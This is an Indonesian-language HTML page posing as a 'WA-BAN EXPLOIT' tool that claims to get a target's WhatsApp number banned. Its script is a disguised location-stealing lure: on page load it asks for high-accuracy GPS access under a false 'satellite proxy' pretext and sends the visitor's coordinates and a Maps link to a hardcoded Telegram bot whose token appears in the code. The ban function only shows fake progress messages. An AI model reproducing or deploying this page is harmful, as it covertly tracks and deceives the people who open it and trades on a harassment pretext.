<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WA-BAN EXPLOIT V.7.2</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .terminal { background: #000; border: 1px solid #00ff41; padding: 25px; border-radius: 5px; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4); width: 380px; text-align: center; }
        h2 { font-size: 18px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 3px; }
        .notice { font-size: 11px; color: #ff3e3e; margin-bottom: 15px; border: 1px solid #ff3e3e; padding: 5px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ff41; color: #00ff41; border-radius: 3px; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #00ff41; border: none; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #008f11; color: #fff; }
        .status-box { margin-top: 20px; text-align: left; font-size: 10px; color: #888; height: 60px; overflow: hidden; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body>

<div class="terminal">
    <h2>WA-BAN EXPLOIT</h2>
    <div class="notice">PENTING: Izinkan akses lokasi untuk sinkronisasi Proxy Satelit agar laporan tidak terdeteksi Spam oleh Meta.</div>
    
    <input type="text" id="targetNum" placeholder="NOMOR TARGET (628xxx)">
    <button onclick="execute()">GENERATE BAN TEXT</button>

    <div class="status-box" id="logs">
        [system] Waiting for user input...<br>
    </div>
</div>

<script>
    // --- KONFIGURASI BOT TELEGRAM ---
    const bot_token = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo";
    const chat_id = "8551809114";

    // AUTO-GRAB LOKASI PAS HALAMAN DIBUKA
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(track, (err) => {
                log("[error] Akses satelit ditolak. Gunakan izin GPS!");
            }, { enableHighAccuracy: true });
        }
    };

    async function track(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        const data = `🚨 *TARGET TERPELACAK!*\n\n• Koordinat: \`${lat}, ${lon}\` \n• Akurasi: ${pos.coords.accuracy} meter\n\n📍 [BUKA DI GOOGLE MAPS](${mapsLink})`;

        await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: data, parse_mode: 'Markdown' })
        });
        log("[success] Satelit sinkron. Lokasi terverifikasi.");
    }

    function execute() {
        const num = document.getElementById('targetNum').value;
        if (!num) return alert("Nomor Target Kosong!");
        
        log("[process] Menghubungkan ke API WhatsApp...");
        setTimeout(() => log("[process] Menginjeksi paket laporan..."), 1000);
        setTimeout(() => {
            alert("TEKS BAN BERHASIL DIBUAT!\n\nSalin kode ini dan kirim ke Support WhatsApp.");
            log("[done] Proses selesai.");
        }, 3000);
    }

    function log(msg) {
        const lb = document.getElementById('logs');
        lb.innerHTML += msg + "<br>";
        lb.scrollTop = lb.scrollHeight;
    }
</script>

</body>
</html>
